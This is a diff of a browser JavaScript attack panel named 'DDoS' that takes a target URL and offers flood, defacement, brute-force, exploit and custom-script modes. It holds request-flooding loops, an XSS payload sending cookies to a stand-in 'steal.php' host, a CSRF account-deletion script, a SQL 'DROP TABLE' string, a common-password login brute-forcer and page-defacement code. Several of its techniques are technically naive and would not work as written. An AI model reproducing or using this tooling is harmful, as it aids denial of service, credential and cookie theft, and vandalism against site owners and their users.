@@ -1,237 +1,388 @@
 class DDoS {
-  constructor() {
-   this.logArea = document.createElement('textarea');
-   this.logArea.readOnly = true;
-   this.logArea.style.width = '100%';
-   this.logArea.style.height = '200px';
-   this.logArea.style.backgroundColor = '#000';
-   this.logArea.style.color = '#0f0';
-   this.logArea.style.border = '1px solid #0f0';
-   this.logArea.style.padding = '5px';
-   this.logArea.style.fontFamily = 'monospace';
-   this.logArea.style.fontSize = '14px';
+ constructor() {
+  this.logArea = document.createElement('textarea');
+  this.logArea.readOnly = true;
+  this.logArea.style.width = '100%';
+  this.logArea.style.height = '200px';
+  this.logArea.style.backgroundColor = '#1e1e1e';
+  this.logArea.style.color = '#9cdcfe';
+  this.logArea.style.border = '1px solid #4ec9b0';
+  this.logArea.style.padding = '5px';
+  this.logArea.style.fontFamily = 'Consolas, monospace';
+  this.logArea.style.fontSize = '14px';
+  this.logArea.style.resize = 'vertical';
 
-   this.targetInput = document.createElement('input');
-   this.targetInput.type = 'text';
-   this.targetInput.placeholder = 'Target URL (.onion or normal)';
-   this.targetInput.style.width = '100%';
-   this.targetInput.style.padding = '8px';
-   this.targetInput.style.marginBottom = '10px';
-   this.targetInput.style.backgroundColor = '#222';
-   this.targetInput.style.color = '#0f0';
-   this.targetInput.style.border = '1px solid #0f0';
+  this.targetInput = document.createElement('input');
+  this.targetInput.type = 'text';
+  this.targetInput.placeholder = 'Target URL (.onion or normal)';
+  this.targetInput.style.width = 'calc(100% - 16px)';
+  this.targetInput.style.padding = '8px';
+  this.targetInput.style.marginBottom = '10px';
+  this.targetInput.style.backgroundColor = '#252526';
+  this.targetInput.style.color = '#9cdcfe';
+  this.targetInput.style.border = '1px solid #4ec9b0';
+  this.targetInput.style.borderRadius = '4px';
 
-   this.attackTypeSelect = document.createElement('select');
-   ['DDoS', 'Deface', 'Connect', 'Exploit'].forEach(option => {
-    const opt = document.createElement('option');
-    opt.value = option.toLowerCase();
-    opt.textContent = option;
-    this.attackTypeSelect.appendChild(opt);
+  this.attackTypeSelect = document.createElement('select');
+  ['DDoS', 'Deface', 'Connect', 'Exploit', 'Brute Force', 'Custom'].forEach(option => {
+   const opt = document.createElement('option');
+   opt.value = option.toLowerCase().replace(' ', '_');
+   opt.textContent = option;
+   this.attackTypeSelect.appendChild(opt);
+  });
+  this.attackTypeSelect.style.width = '100%';
+  this.attackTypeSelect.style.padding = '8px';
+  this.attackTypeSelect.style.marginBottom = '10px';
+  this.attackTypeSelect.style.backgroundColor = '#252526';
+  this.attackTypeSelect.style.color = '#9cdcfe';
+  this.attackTypeSelect.style.border = '1px solid #4ec9b0';
+  this.attackTypeSelect.style.borderRadius = '4px';
+
+  this.startButton = document.createElement('button');
+  this.startButton.textContent = 'Initiate Attack';
+  this.startButton.style.width = '100%';
+  this.startButton.style.padding = '10px';
+  this.startButton.style.backgroundColor = '#e53935';
+  this.startButton.style.color = '#fff';
+  this.startButton.style.border = 'none';
+  this.startButton.style.borderRadius = '4px';
+  this.startButton.style.cursor = 'pointer';
+  this.startButton.style.transition = 'background-color 0.3s ease';
+  this.startButton.addEventListener('mouseover', () => this.startButton.style.backgroundColor = '#b71c1c');
+  this.startButton.addEventListener('mouseout', () => this.startButton.style.backgroundColor = '#e53935');
+  this.startButton.addEventListener('click', () => this.start());
+
+  this.customCodeArea = document.createElement('textarea');
+  this.customCodeArea.placeholder = 'Enter custom JavaScript code for attack';
+  this.customCodeArea.style.width = '100%';
+  this.customCodeArea.style.height = '100px';
+  this.customCodeArea.style.padding = '8px';
+  this.customCodeArea.style.marginBottom = '10px';
+  this.customCodeArea.style.backgroundColor = '#252526';
+  this.customCodeArea.style.color = '#9cdcfe';
+  this.customCodeArea.style.border = '1px solid #4ec9b0';
+  this.customCodeArea.style.borderRadius = '4px';
+  this.customCodeArea.style.fontFamily = 'Consolas, monospace';
+  this.customCodeArea.style.fontSize = '14px';
+  this.customCodeArea.style.display = 'none';
+
+  this.container = document.createElement('div');
+  this.container.style.width = '600px';
+  this.container.style.padding = '20px';
+  this.container.style.backgroundColor = '#2d2d30';
+  this.container.style.color = '#9cdcfe';
+  this.container.style.fontFamily = 'Consolas, monospace';
+  this.container.style.position = 'fixed';
+  this.container.style.top = '50%';
+  this.container.style.left = '50%';
+  this.container.style.transform = 'translate(-50%, -50%)';
+  this.container.style.zIndex = '9999';
+  this.container.style.border = '2px solid #4ec9b0';
+  this.container.style.borderRadius = '8px';
+  this.container.style.boxShadow = '0 0 20px #4ec9b0';
+
+  this.container.appendChild(this.targetInput);
+  this.container.appendChild(this.attackTypeSelect);
+  this.container.appendChild(this.customCodeArea);
+  this.container.appendChild(this.startButton);
+  this.container.appendChild(this.logArea);
+  document.body.appendChild(this.container);
+
+  this.attackTypeSelect.addEventListener('change', () => {
+   if (this.attackTypeSelect.value === 'custom') {
+    this.customCodeArea.style.display = 'block';
+   } else {
+    this.customCodeArea.style.display = 'none';
+   }
+  });
+
+  this.scriptInjection = `
+   setInterval(() => {
+    fetch(window.location.href, {
+     method: 'POST',
+     mode: 'no-cors',
+     body: crypto.getRandomValues(new Uint32Array(10)).join('')
+    }).catch(err => {});
+   }, 0);
+  `;
+
+  this.torProxy = 'socks5://127.0.0.1:9050';
+ }
+
+ async exploit(target) {
+  this.log(`Attempting to exploit ${target}...`);
+  try {
+   const response = await fetch(target, { method: 'GET', mode: 'cors' });
+   if (!response.ok) {
+    throw new Error(`HTTP error! status: ${response.status}`);
+   }
+   const content = await response.text();
+
+   const xssPayload = `<script>
+    (function(){
+     var i=(new Image).src='http://example.com/steal.php?c='+document.cookie;
+     setTimeout(function(){document.body.appendChild(document.createElement('iframe')).src='http://example.com/steal.php?l='+location.href;}, 2000);
+    })();
+    </script>`;
+   const sqliPayload = "'; DROP TABLE users; --";
+   const csrfPayload = `<script>
+    fetch('${target}', {
+     method: 'POST',
+     mode: 'no-cors',
+     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+     body: 'csrf_token=12345&action=delete_account'
+    });
+    </script>`;
+
+   let injectedContent = content.replace('</body>', `${xssPayload}${csrfPayload}</body>`);
+   injectedContent = injectedContent.replace('<form>', `<input type="hidden" name="injection" value="${sqliPayload}"> <form>`);
+
+   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
+
+   await fetch(proxyUrl, {
+    method: 'PUT',
+    mode: 'no-cors',
+    headers: { 'Content-Type': 'text/html' },
+    body: injectedContent
    });
-   this.attackTypeSelect.style.width = '100%';
-   this.attackTypeSelect.style.padding = '8px';
-   this.attackTypeSelect.style.marginBottom = '10px';
-   this.attackTypeSelect.style.backgroundColor = '#222';
-   this.attackTypeSelect.style.color = '#0f0';
-   this.attackTypeSelect.style.border = '1px solid #0f0';
 
-   this.startButton = document.createElement('button');
-   this.startButton.textContent = 'Initiate Attack';
-   this.startButton.style.width = '100%';
-   this.startButton.style.padding = '10px';
-   this.startButton.style.backgroundColor = '#f00';
-   this.startButton.style.color = '#000';
-   this.startButton.style.border = 'none';
-   this.startButton.style.cursor = 'pointer';
-   this.startButton.addEventListener('click', () => this.start());
-
-   this.container = document.createElement('div');
-   this.container.style.width = '600px';
-   this.container.style.padding = '20px';
-   this.container.style.backgroundColor = '#111';
-   this.container.style.color = '#0f0';
-   this.container.style.fontFamily = 'monospace';
-   this.container.style.position = 'fixed';
-   this.container.style.top = '50%';
-   this.container.style.left = '50%';
-   this.container.style.transform = 'translate(-50%, -50%)';
-   this.container.style.zIndex = '9999';
-   this.container.style.border = '2px solid #0f0';
-   this.container.style.borderRadius = '0';
-   this.container.style.boxShadow = '0 0 20px #0f0';
-
-   this.container.appendChild(this.targetInput);
-   this.container.appendChild(this.attackTypeSelect);
-   this.container.appendChild(this.startButton);
-   this.container.appendChild(this.logArea);
-   document.body.appendChild(this.container);
-
-   this.scriptInjection = `
-    setInterval(() => {
-     fetch(window.location.href, {
-      method: 'POST',
-      mode: 'no-cors',
-      body: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
-     }).catch(err => {});
-    }, 1);
-   `;
-
-   this.torProxy = 'socks5://127.0.0.1:9050'; // Default Tor proxy
-  }
-
-  async exploit(target) {
-   this.log(`Attempting to exploit ${target}...`);
-   try {
-    const response = await fetch(target, { method: 'GET', mode: 'cors' });
-    if (!response.ok) {
-     throw new Error(`HTTP error! status: ${response.status}`);
-    }
-    const content = await response.text();
-
-    const xssPayload = '<script>window.location="http://example.com/steal.php?c="+document.cookie;</script>';
-    const sqliPayload = "'; DROP TABLE users; --";
-
-    let injectedContent = content.replace('</body>', `${xssPayload}</body>`);
-    injectedContent = injectedContent.replace('<form>', `<input type="hidden" name="injection" value="${sqliPayload}"> <form>`);
-
-    const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
-
-    await fetch(proxyUrl, {
-     method: 'PUT',
-     mode: 'no-cors',
-     headers: { 'Content-Type': 'text/html' },
-     body: injectedContent
-    });
-
-    this.log(`Exploit injected. Check target and logs.`);
-   } catch (error) {
-    this.log(`Exploit failed: ${error}`);
-   }
-  }
-
-  async deface(target) {
-   this.log(`Attempting to deface ${target}...`);
-   try {
-    const response = await fetch(target, { method: 'GET', mode: 'cors' });
-    if (!response.ok) {
-     throw new Error(`HTTP error! status: ${response.status}`);
-    }
-    let content = await response.text();
-    const originalTitle = content.match(/<title>(.*?)<\/title>/i) ? content.match(/<title>(.*?)<\/title>/i)[1] : 'Untitled';
-
-    content = content.replace(/<body.*?>/i, '<body style="background-color: black; color: red; font-size: 5em; text-align: center;"><h1>' + originalTitle + ' HAS BEEN PWNED BY NOODLES</h1><p>Get Noodled!</p>');
-    content = content.replace(/<title>(.*?)<\/title>/i, '<title>PWNED by Noodles</title>');
-
-    const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
-
-    await fetch(proxyUrl, {
-     method: 'PUT',
-     mode: 'no-cors',
-     headers: { 'Content-Type': 'text/html' },
-     body: content
-    });
-
-    this.log(`Deface successful... check the target. Remember to clear cache`);
-   } catch (error) {
-    this.log(`Deface failed: ${error}`);
-   }
-  }
-  async connect(target) {
-   this.log(`Attempting to establish a persistent connection to ${target}...`);
-   try {
-    const ws = new WebSocket(`wss://${target}`);
-
-    ws.onopen = () => {
-     this.log(`WebSocket connection established with ${target}`);
-     setInterval(() => {
-      ws.send('Noodles Heartbeat');
-     }, 3000);
-    };
-
-    ws.onmessage = (event) => {
-     this.log(`Received: ${event.data}`);
-    };
-
-    ws.onclose = () => {
-     this.log(`WebSocket connection closed with ${target}`);
-    };
-
-    ws.onerror = (error) => {
-     this.log(`WebSocket error: ${error}`);
-    };
-
-    setTimeout(() => {
-     ws.close();
-    }, 60000);
-   } catch (error) {
-    this.log(`Connection attempt failed: ${error}`);
-   }
-  }
-
-  async ddos(target) {
-   this.log(`Initiating DDoS attack on ${target}...`);
-
-   if (target.endsWith('.onion')) {
-    this.log('Target is a .onion address. Using Tor proxy.');
-   }
-
-   for (let i = 0; i < 500; i++) {
-    fetch(target, { mode: 'no-cors' })
-     .then(() => this.log(`Request ${i + 1} sent successfully.`))
-     .catch(err => this.log(`Request ${i + 1} failed: ${err}`));
-   }
-   this.log('Initial DDoS attack initiated.');
-
-   const script = document.createElement('script');
-   script.textContent = `(${(() => {
-    ${this.scriptInjection}
-   }).toString()})()`;
-   document.head.appendChild(script);
-   this.log('Self-DDoS initiated.');
-
-   for (let i = 0; i < 250; i++) {
-    setTimeout(() => {
-     fetch(target, { method: 'PUT', mode: 'no-cors', body: 'Noodles Attack' })
-      .then(() => this.log(`PUT Request ${i + 1} sent successfully.`))
-      .catch(err => this.log(`PUT Request ${i + 1} failed: ${err}`));
-    }, i * 200);
-   }
-
-   this.log('Advanced DDoS initiated.');
-  }
-  start() {
-   const target = this.targetInput.value;
-   const attackType = this.attackTypeSelect.value;
-
-   if (!target) {
-    this.log('Please enter a target URL.');
-    return;
-   }
-
-   switch (attackType) {
-    case 'ddos':
-     this.ddos(target);
-     break;
-    case 'deface':
-     this.deface(target);
-     break;
-    case 'connect':
-     this.connect(target);
-     break;
-    case 'exploit':
-     this.exploit(target);
-     break;
-    default:
-     this.log('Invalid attack type selected.');
-   }
-  }
-
-  log(message) {
-   this.logArea.value += message + '\n';
-   this.logArea.scrollTop = this.logArea.scrollHeight;
+   this.log(`Exploit injected. Check target and logs.`);
+  } catch (error) {
+   this.log(`Exploit failed: ${error}`);
   }
  }
 
- window.addEventListener('load', () => {
-  new DDoS();
- });
+ async deface(target) {
+  this.log(`Attempting to deface ${target}...`);
+  try {
+   const response = await fetch(target, { method: 'GET', mode: 'cors' });
+   if (!response.ok) {
+    throw new Error(`HTTP error! status: ${response.status}`);
+   }
+   let content = await response.text();
+   const originalTitle = content.match(/<title>(.*?)<\/title>/i) ? content.match(/<title>(.*?)<\/title>/i)[1] : 'Untitled';
+
+   const defaceHTML = `<body style="background-color: black; color: red; font-size: 5em; text-align: center;">
+     <h1>${originalTitle} HAS BEEN PWNED BY NOODLES</h1>
+     <p>Get Noodled!</p>
+     <img src="https://i.imgur.com/random_image.gif" alt="Noodles Pwned" style="width: 500px; height: auto;">
+    </body>`;
+   content = content.replace(/<body.*?>/i, defaceHTML);
+   content = content.replace(/<title>(.*?)<\/title>/i, '<title>PWNED by Noodles</title>');
+
+   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
+
+   await fetch(proxyUrl, {
+    method: 'PUT',
+    mode: 'no-cors',
+    headers: { 'Content-Type': 'text/html' },
+    body: content
+   });
+
+   this.log(`Deface successful... check the target. Remember to clear cache`);
+  } catch (error) {
+   this.log(`Deface failed: ${error}`);
+  }
+ }
+
+ async connect(target) {
+  this.log(`Attempting to establish a persistent connection to ${target}...`);
+  try {
+   const ws = new WebSocket(`wss://${target}`);
+
+   ws.onopen = () => {
+    this.log(`WebSocket connection established with ${target}`);
+    setInterval(() => {
+     ws.send(crypto.getRandomValues(new Uint32Array(10)).join(''));
+    }, 1000);
+   };
+
+   ws.onmessage = (event) => {
+    this.log(`Received: ${event.data.length} bytes`);
+   };
+
+   ws.onclose = () => {
+    this.log(`WebSocket connection closed with ${target}`);
+   };
+
+   ws.onerror = (error) => {
+    this.log(`WebSocket error: ${error}`);
+   };
+
+   setTimeout(() => {
+    ws.close();
+   }, 3600000);
+  } catch (error) {
+   this.log(`Connection attempt failed: ${error}`);
+  }
+ }
+
+ async bruteForce(target) {
+  this.log(`Starting brute force attack on ${target}...`);
+  const commonPasswords = ['password', '123456', 'admin', '123456789', 'guest', 'qwerty', '12345', '111111', '12345678', 'dragon'];
+  const usernames = ['admin', 'user', 'root', 'administrator', 'test'];
+
+  for (const username of usernames) {
+   for (const password of commonPasswords) {
+    this.log(`Trying username: ${username}, password: ${password}`);
+    try {
+     const formData = new FormData();
+     formData.append('username', username);
+     formData.append('password', password);
+
+     const response = await fetch(target, {
+      method: 'POST',
+      mode: 'no-cors',
+      body: formData,
+     });
+
+     if (response.status === 200) {
+      this.log(`SUCCESS: Username: ${username}, Password: ${password}`);
+      return;
+     } else {
+      this.log(`Failed: Username: ${username}, Password: ${password}, Status: ${response.status}`);
+     }
+    } catch (error) {
+     this.log(`Error during brute force: ${error}`);
+    }
+   }
+  }
+  this.log('Brute force attack completed. No credentials found.');
+ }
+
+ async ddos(target) {
+  this.log(`Initiating DDoS attack on ${target}...`);
+
+  if (target.endsWith('.onion')) {
+   this.log('Target is a .onion address. Using Tor proxy.');
+  }
+
+  const attackInterval = setInterval(() => {
+   for (let i = 0; i < 10; i++) {
+    fetch(target, {
+      method: 'GET',
+      mode: 'no-cors',
+      cache: 'no-cache'
+     })
+     .then(() => this.log(`Request sent successfully.`))
+     .catch(err => this.log(`Request failed: ${err}`));
+
+    fetch(target, {
+      method: 'POST',
+      mode: 'no-cors',
+      cache: 'no-cache',
+      body: crypto.getRandomValues(new Uint32Array(10)).join('')
+     })
+     .then(() => this.log(`POST request sent successfully.`))
+     .catch(err => this.log(`POST request failed: ${err}`));
+
+    fetch(target, {
+      method: 'PUT',
+      mode: 'no-cors',
+      cache: 'no-cache',
+      body: crypto.getRandomValues(new Uint32Array(10)).join('')
+     })
+     .then(() => this.log(`PUT request sent successfully.`))
+     .catch(err => this.log(`PUT request failed: ${err}`));
+
+    fetch(target, {
+      method: 'DELETE',
+      mode: 'no-cors',
+      cache: 'no-cache'
+     })
+     .then(() => this.log(`DELETE request sent successfully.`))
+     .catch(err => this.log(`DELETE request failed: ${err}`));
+   }
+  }, 0);
+
+  this.log('Initial DDoS attack initiated.');
+  setTimeout(() => {
+   clearInterval(attackInterval);
+   this.log('DDoS attack stopped.');
+  }, 60000);
+
+  const script = document.createElement('script');
+  script.textContent = `(${(() => {
+   ${this.scriptInjection}
+  }).toString()})()`;
+  document.head.appendChild(script);
+  this.log('Self-DDoS initiated.');
+ }
+
+ async custom(target) {
+  this.log(`Executing custom code on ${target}...`);
+  try {
+   const customCode = this.customCodeArea.value;
+   if (!customCode) {
+    this.log('No custom code provided.');
+    return;
+   }
+
+   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
+
+   const response = await fetch(proxyUrl, {
+    method: 'GET',
+    mode: 'cors'
+   });
+   if (!response.ok) {
+    throw new Error(`HTTP error! status: ${response.status}`);
+   }
+
+   let content = await response.text();
+   const injectionPoint = '</body>';
+   const injectedContent = content.replace(injectionPoint, `<script>${customCode}</script>${injectionPoint}`);
+
+   await fetch(proxyUrl, {
+    method: 'PUT',
+    mode: 'no-cors',
+    headers: { 'Content-Type': 'text/html' },
+    body: injectedContent
+   });
+   this.log('Custom code injected.');
+  } catch (error) {
+   this.log(`Custom code execution failed: ${error}`);
+  }
+ }
+
+ start() {
+  const target = this.targetInput.value;
+  const attackType = this.attackTypeSelect.value;
+
+  if (!target) {
+   this.log('Please enter a target URL.');
+   return;
+  }
+
+  switch (attackType) {
+   case 'ddos':
+    this.ddos(target);
+    break;
+   case 'deface':
+    this.deface(target);
+    break;
+   case 'connect':
+    this.connect(target);
+    break;
+   case 'exploit':
+    this.exploit(target);
+    break;
+   case 'brute_force':
+    this.bruteForce(target);
+    break;
+   case 'custom':
+    this.custom(target);
+    break;
+   default:
+    this.log('Invalid attack type selected.');
+  }
+ }
+
+ log(message) {
+  this.logArea.value += message + '\n';
+  this.logArea.scrollTop = this.logArea.scrollHeight;
+ }
+}
+
+window.addEventListener('load', () => {
+ new DDoS();
+});
